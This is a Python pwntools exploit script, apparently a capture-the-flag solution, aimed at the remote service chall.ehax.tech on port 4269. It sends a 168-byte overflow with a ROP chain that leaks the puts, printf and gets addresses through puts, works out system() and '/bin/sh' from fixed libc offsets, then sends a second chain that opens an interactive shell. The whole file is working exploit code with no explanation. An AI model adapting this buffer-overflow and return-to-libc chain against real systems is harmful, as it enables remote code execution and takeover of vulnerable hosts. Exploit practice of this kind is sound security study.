from pwn import p64, remote, log, ELF, context, u64

context.log_level = 'debug'
r = remote('chall.ehax.tech', 4269)
libcELF = ELF('chall', False)

poprdi = 0x400973
ret = 0x40061e
puts_plt = libcELF.plt['puts']
puts_got = libcELF.got['puts']
printf_got = libcELF.got['printf']
gets_got = libcELF.got['gets']

payload = b'A' * 168
payload += p64(poprdi)
payload += p64(puts_got)
payload += p64(puts_plt)

payload += p64(poprdi)
payload += p64(printf_got)
payload += p64(puts_plt)

payload += p64(poprdi)
payload += p64(gets_got)
payload += p64(puts_plt)

payload += p64(0x400787)        # Exploit again

r.recvuntil(': ')
r.sendline(payload)

r.recvuntil('Login\x0a')

puts_leak = u64(r.recv(6).ljust(8, b'\x00'))
r.recvuntil('\x0a')
printf_leak = u64(r.recv(6).ljust(8, b'\x00'))
r.recvuntil('\x0a')
gets_leak = u64(r.recv(6).ljust(8, b'\x00'))
r.recvuntil('\x0a')

log.info(f'Address of puts(): {hex(puts_leak)}')
log.info(f'Address of printf(): {hex(printf_leak)}')
log.info(f'Address of gets(): {hex(gets_leak)}')

system_addr = puts_leak - 0x31550
binsh_addr = puts_leak + 0x133418
log.info(f'Address of system(): {hex(system_addr)}')
log.info(f'Address of /bin/sh: {hex(binsh_addr)}')

# Get shell
payload = b'A' * 168
payload += p64(ret)         # For aligning the stack
payload += p64(poprdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

r.recvuntil(': ')
r.sendline(payload)
r.interactive()